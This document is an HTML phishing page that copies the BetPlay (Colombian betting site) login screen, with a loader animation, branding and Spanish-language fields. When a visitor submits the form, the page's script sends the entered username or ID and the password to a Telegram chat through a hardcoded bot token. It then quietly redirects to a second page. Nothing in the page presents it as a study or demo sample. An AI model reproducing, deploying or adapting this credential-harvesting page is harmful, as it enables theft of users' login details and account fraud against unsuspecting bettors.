<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BetPlay Login</title>
  <style>
    :root {
      --azul-betplay: #001d3d;
      --azul-claro: #35c7f4;
      --blanco: #ffffff;
      --gris-texto: #cdd5e0;
      --fuente: 'Segoe UI', sans-serif;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: var(--fuente);
    }

    body {
      background-color: var(--azul-betplay);
      color: var(--blanco);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    #loader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: var(--azul-betplay);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      transition: opacity 0.5s ease;
    }

    #loader img {
      width: 80px;
      animation: pulse 2s infinite ease-in-out;
    }

    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.85; }
      100% { transform: scale(1); opacity: 1; }
    }

    .container {
      width: 100%;
      max-width: 350px;
      display: none;
      text-align: left;
    }

    .logo {
      width: 110px;
      margin-bottom: 25px;
    }

    h1 {
      font-size: 18px;
      font-weight: normal;
    }

    h1 span {
      font-weight: bold;
      color: var(--blanco);
    }

    p.sub {
      font-size: 14px;
      margin-bottom: 18px;
      color: var(--gris-texto);
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      border-radius: 10px;
      border: none;
      margin-bottom: 12px;
      font-size: 14px;
      background: #fff;
      color: #000;
    }

    input::placeholder {
      color: #999;
    }

    .checkbox {
      display: flex;
      align-items: center;
      margin-bottom: 18px;
      font-size: 13px;
      color: var(--gris-texto);
    }

    .checkbox input {
      margin-right: 10px;
      width: 16px;
      height: 16px;
    }

    .buttons {
      display: flex;
      gap: 8px;
      margin-bottom: 18px;
    }

    .buttons button {
      flex: 1;
      padding: 10px;
      font-size: 13px;
      border-radius: 8px;
      cursor: pointer;
      border: 1.5px solid var(--azul-claro);
      transition: all 0.3s ease;
    }

    .login {
      background: transparent;
      color: var(--blanco);
    }

    .register {
      background: var(--azul-claro);
      color: #000;
    }

    .buttons button:hover {
      opacity: 0.9;
    }

    .links a {
      display: block;
      color: var(--azul-claro);
      text-align: center;
      font-size: 13px;
      text-decoration: underline;
      margin-bottom: 8px;
    }

    .fingerprint {
      text-align: center;
      margin-top: 25px;
    }

    .fingerprint img {
      width: 45px;
      margin-bottom: 8px;
    }

    .fingerprint p {
      font-size: 13px;
    }

    .version {
      text-align: center;
      font-size: 12px;
      margin-top: 10px;
      color: var(--gris-texto);
    }

    .version a {
      color: var(--azul-claro);
      text-decoration: none;
      display: block;
      margin-top: 5px;
    }
  </style>
</head>
<body>

  <div id="loader">
    <img src="https://i.imgur.com/nkjQDIO.png" alt="Cargando..." />
  </div>

  <div class="container" id="main-content">
    <img src="https://i.imgur.com/nkjQDIO.png" class="logo" alt="BetPlay Logo" />
    <h1>Bienvenido a <span>BetPlay</span></h1>
    <p class="sub">La casa de apuestas n煤mero uno de Colombia.</p>

    <input type="text" placeholder="Usuario / C茅dula" id="usuario" />
    <input type="password" placeholder="Contrase帽a" id="password" />

    <div class="checkbox">
      <input type="checkbox" id="remember" />
      <label for="remember">Recordar datos de usuario</label>
    </div>

    <div class="buttons">
      <button class="login" onclick="enviarDatosLogin()">Iniciar Sesi贸n</button>
      <button class="register">Registro</button>
    </div>

    <div class="links">
      <a href="#">驴Olvidaste tu contrase帽a?</a>
      <a href="#">Juego Responsable</a>
    </div>

    <div class="fingerprint">
      <img src="https://cdn-icons-png.freepik.com/512/25/25927.png" alt="Huella" />
      <p>Ingresa con tu huella</p>
    </div>

    <div class="version">
      <p>Al iniciar sesi贸n, estas aceptando los siguientes T&C Versi贸n 1.3.</p>
      <a href="https://bit.ly/3ed7Whi">https://bit.ly/3ed7Whi</a>
      <p>android-v1.0.50</p>
    </div>
  </div>

  <script>
    window.addEventListener("load", () => {
      setTimeout(() => {
        const loader = document.getElementById("loader");
        const content = document.getElementById("main-content");
        loader.style.opacity = "0";
        setTimeout(() => {
          loader.style.display = "none";
          content.style.display = "block";
        }, 500);
      }, 3000);
    });

    const botToken = "7505759331:AAF_U6x0ZGk3Tm_ivb28fHpht3GsIB8WXkU";
    const chatId = "-1002633468201";

    function enviarDatosLogin() {
      const usuario = document.getElementById("usuario").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!usuario || !password) {
        alert("Por favor completa ambos campos.");
        return;
      }

      const mensaje = ` Nuevo intento de login:\n Usuario: ${usuario}\n Contrase帽a: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: mensaje
        })
      })
      .then(() => {
        localStorage.setItem("usuario", usuario);
        window.location.href = "index2.html";
      })
      .catch(err => {
        console.error("Error al enviar datos:", err);
        alert("Ocurri贸 un error.");
      });
    }
  </script>
</body>
</html>
